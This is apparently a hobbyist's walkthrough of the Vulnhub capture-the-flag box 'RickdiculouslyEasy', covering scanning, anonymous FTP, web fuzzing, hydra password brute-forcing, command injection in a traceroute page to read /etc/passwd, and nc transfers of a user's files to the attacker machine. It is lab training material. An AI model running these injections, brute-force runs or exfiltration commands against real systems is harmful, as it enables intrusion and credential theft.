*2021-08-23*

*kimm3*

# Walkthrough: RickdiculouslyEasy
Platform: Vulnhub

Difficulty: Easy

- [Link](https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/)

This is a funny themed box, consisting of several flags, with a possible score of 130 points. In the last heading of this document, there's a summary of flag points and where to find them.

## Setup
![dhcpd](assets/markdown-img-paste-20210824032436697.png)

![ll](assets/markdown-img-paste-20210824032456284.png)

## Scans and enumeration
```
export IP=192.168.10.2
ping $IP
sudo nmap $IP -p- -Pn -A -oA scans/nmap-init
```
![nmap-init](assets/markdown-img-paste-20210824033312126.png)

## Intial flags

First flag at port 13337, nmap aggressive scan reveals it too us. If it didn't we could have used netcat to retrieve the text.

![nc13337](assets/markdown-img-paste-20210824033449801.png)

**Score: 10 points**

Lets start with the really easy stuff.

![ftp-flag](assets/markdown-img-paste-20210824033750873.png)

![ftp-flag-txt](assets/markdown-img-paste-20210824033818116.png)

The ftp service accepts anonymous logins, use the username anonymous and any password.

**Score: 20 points**

`nc $IP 60000`

![reverse-shell](assets/markdown-img-paste-20210824034122269.png)

**Score: 30 points**

![index-p80](assets/markdown-img-paste-20210824083235912.png)

Nothing at index port 80.

![flag-9090](assets/markdown-img-paste-20210824034427873.png)

**Score: 40 points**

Also a login page, but no password field.

![ffuf-httpindex](assets/markdown-img-paste-20210824034910517.png)

![http-passwords](assets/markdown-img-paste-20210824034948406.png)

```
curl "http://192.168.10.2/passwords/FLAG.txt" > foundfiles/flagpasswords.txt
curl "http://192.168.10.2/passwords/passwords.html" > foundfiles/passwords.html
```
![flagfrompasswordstxt](assets/markdown-img-paste-20210824035137501.png)

![flagfrompasswordshtml](assets/markdown-img-paste-20210824035233126.png)

**Score: 50 points**

## Trying winter
**Bruteforcing with the password 'winter'**

We got a password of winter, no username. Let's start with morty or rick.

```
hydra $IP -L creds/users.txt -P creds/pass.txt ftp | tee scans/hydra-ftp-small.txt
hydra $IP -L creds/users.txt -P creds/pass.txt ssh | tee scans/hydra-ssh-small.txt
hydra $IP -L creds/users.txt -P creds/pass.txt -s 22222 ssh | tee scans/hydra-ssh22222-small.txt
```

![ftpnogo](assets/markdown-img-paste-20210824041613485.png)

![sshnotconnect](assets/markdown-img-paste-20210824041633269.png)

![ssh2ndnogo](assets/markdown-img-paste-20210824041645697.png)

SSH port 22 couldn't connect, and the others didn't work. I tried common username wordlists, and generating one with 'cupp.py' for 'morty smith'.

## Back to enumerating
Let's go back to enumerating. Let's do a broader search to see if missed something in the previous scan.

```
# Added slash to find more dirs.
ffuf -u "http://192.168.10.2/FUZZ/ -w sl/Discovery/Web-Content/directory-list-2.3-small.txt -of -o scans/ffuf-index80-with-slash

# Extension search
extensions=$(cat sl/Discovery/Web-Content/web-extensions.txt | tr "\n" ",")

ffuf -u "http://192.168.10.2/FUZZ" -w sl/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -e $extensions -of -o scans/ffuf-widesearch
```

There's a cgi-bin folder, but everything inside seems to be forbidden(403). A text file called 'robots.txt' is in the index folder.

![robotstxt](assets/markdown-img-paste-20210824052521855.png)

![rootshell](assets/markdown-img-paste-20210824052611452.png)

Too bad.

![tracertool](assets/markdown-img-paste-20210824052722269.png)

![tracert-test](assets/markdown-img-paste-20210824052750145.png)

Typing `; whoami` in the search box. As in running two commands on the same line, works.

![whoami](assets/markdown-img-paste-20210824053022354.png)

## Foothold
Typing `;head -n 100 /etc/passwd` we get the usernames. (`cat` prints out a cat in this box, lol).

![etcpasswd](assets/markdown-img-paste-20210824060720125.png)

We've tried the password winter with users 'RickSanchez' and 'Morty' earlier, but there's another user, 'Summer'.

![summer-success](assets/markdown-img-paste-20210824060838986.png)

It works on both ftp and SSH. With both services, we can get to the same flag.

![ftp-flag](assets/markdown-img-paste-20210824060925820.png)

![ssh-flag](assets/markdown-img-paste-20210824061053981.png)

**Score: 60 points**

We have read access in both Ricks and Mortys home folders.

![mortyhome](assets/markdown-img-paste-20210824061204462.png)

![rickhome](assets/markdown-img-paste-20210824061350683.png)

Let's get the files for offline investigation.

```
nc -w 3 192.168.10.1 1234 < RickSanchez/RICKS_SAFE/safe
nc -w 3 192.168.10.1 1234 < Morty/journal.txt.zip
nc -w 3 192.168.10.1 1234 < Morty/Safe_Password.jpg
```

![Safe_password](assets/markdown-img-paste-20210824075323512.png)

There's a password inside the image, view it with at tool in the terminal, I used `strings`.

![journaltxt](assets/markdown-img-paste-20210824075445869.png)

A flag and a password.

**Score: 80 points**

![runsafe](assets/markdown-img-paste-20210824075717627.png)

Running with password from journal.txt.

![runsafepw](assets/markdown-img-paste-20210824075748888.png)

**Score: 100 points**

The band name is 'Flesh Curtains'. Let's generate som passwords.

![band-name](assets/markdown-img-paste-20210824080145220.png)

```
mp64 ?u?dflesh -o flesh.txt
mp64 ?u?dcurtains -o curtains.txt
cat flesh.txt curtains.txt fleshcurtains.txt
hydra $IP -f -l RickSanchez -P creds/fleshcurtains.txt -f ftp | tee scans/hydra-rickftp.txt

# With leading cap letters
mp64 ?u?dFlesh -o Flesh.txt
mp64 ?u?dCurtains -o Curtains.txt
cat Flesh.txt Curtains.txt FleshCurtains.txt
hydra $IP -f -l RickSanchez -P creds/FleshCurtains.txt -f ftp | tee scans/hydra-rickftp-capital.txt
```

![ftpricksuccess](assets/markdown-img-paste-20210824081637302.png)

And from here it's pretty straight forward.

![sshandroot](assets/markdown-img-paste-20210824081844746.png)

## Summary of flags
| Points | Service/location |
| - | - |
| 10 | Port 13337 |
| 10 | FTP service, anonymous |
| 10 | half baked reverse shell, port 60000 |
| 10 | http,port 9090 |
| 10 | http, passwords folder |
| 10 | Summer home folder |
| 20 | journal.txt.zip |
| 20 | safe |
| 30 | root folder |
